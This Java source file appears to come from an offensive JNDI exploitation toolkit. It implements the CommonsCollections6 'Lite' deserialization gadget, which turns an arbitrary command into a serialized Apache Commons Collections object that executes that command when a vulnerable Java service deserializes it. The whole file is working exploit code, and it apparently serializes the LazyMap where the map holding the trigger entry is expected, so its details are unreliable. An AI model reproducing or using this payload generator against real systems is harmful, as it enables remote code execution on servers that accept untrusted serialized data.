package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Reflections;
import com.nu1r.jndi.gadgets.utils.cc.TransformerUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CommonsCollections6Lite implements ObjectPayload<Object> {

    public byte[] getBytes(PayloadType type, String... param) throws Exception {
        String command = param[0];
        Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] transformers     = TransformerUtil.makeTransformer(command);
        Transformer   transformerChain = new ChainedTransformer(fakeTransformers);
        Map           innerMap         = new HashMap();
        Map           outerMap         = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry  tme              = new TiedMapEntry(outerMap, "nu1r");
        Map           expMap           = new HashMap();
        expMap.put(tme, "nu1r");
        outerMap.remove("nu1r");

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(outerMap);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }

    @Override
    public Object getObject(String command) throws Exception {
        return null;
    }
}
